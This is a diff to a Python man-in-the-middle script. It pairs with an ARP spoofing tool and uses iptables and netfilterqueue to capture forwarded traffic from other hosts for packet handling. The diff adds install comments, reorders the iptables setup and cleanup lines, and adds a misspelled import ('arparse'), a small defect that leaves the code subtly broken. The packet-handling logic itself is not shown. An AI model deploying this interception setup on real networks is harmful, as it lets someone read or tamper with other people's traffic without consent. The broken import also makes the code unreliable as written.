@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 ############################# [ IMPORTS ] #############################
 
-import netfilterqueue, re, os
+import netfilterqueue, re, os, arparse
 from scapy.all import *
 
 ############################# [ VARIABLES ] #############################
@@ -74,6 +74,11 @@ def handlePacket(packet):
 
 # /!\ NEED to be run with ARP_Spoof.py and in root
 
+# -------------------
+# apt install python3-pip git libnfnetlink-dev libnetfilter-queue-dev
+# pip3 install -U git+https://github.com/kti/python-netfilterqueue
+# -------------------
+
 options = getArgs()
 
 queue = netfilterqueue.NetfilterQueue()
@@ -84,17 +89,18 @@ try:
     if not os.geteuid()==0:
         print('\n[-] This script must be run as root!')
         exit(1)
-     else:
-        # subprocess.run(f"sudo iptables -I INPUT -j NFQUEUE --queue-num {options.queue}", shell=True)  # Current machine
-        # subprocess.run(f"sudo iptables -I OUTPUT -j NFQUEUE --queue-num {options.queue}", shell=True)
-        subprocess.run(f"sudo iptables -I FORWARD -j NFQUEUE --queue-num {options.queue}", shell=True)  # MITM 
+    else:
+         subprocess.run(f"sudo iptables -I FORWARD -j NFQUEUE --queue-num {options.queue}", shell=True)  # MITM 
+         # subprocess.run(f"sudo iptables -I INPUT -j NFQUEUE --queue-num {options.queue}", shell=True)  # Current machine 
+         # subprocess.run(f"sudo iptables -I OUTPUT -j NFQUEUE --queue-num {options.queue}", shell=True)
+        
     while True:
         queue.run()
 except KeyboardInterrupt:
     print("\n[-] Exiting program ...")
+    subprocess.run(f"sudo iptables -D FORWARD -j NFQUEUE --queue-num {options.queue}", shell=True)
     # subprocess.run(f"sudo iptables -D INPUT -j NFQUEUE --queue-num {options.queue}", shell=True)
     # subprocess.run(f"sudo iptables -D OUTPUT -j NFQUEUE --queue-num {options.queue}", shell=True)
-    subprocess.run(f"sudo iptables -D FORWARD -j NFQUEUE --queue-num {options.queue}", shell=True)
     exit()
     #time.sleep(0.052)
     #time.sleep(0.045)
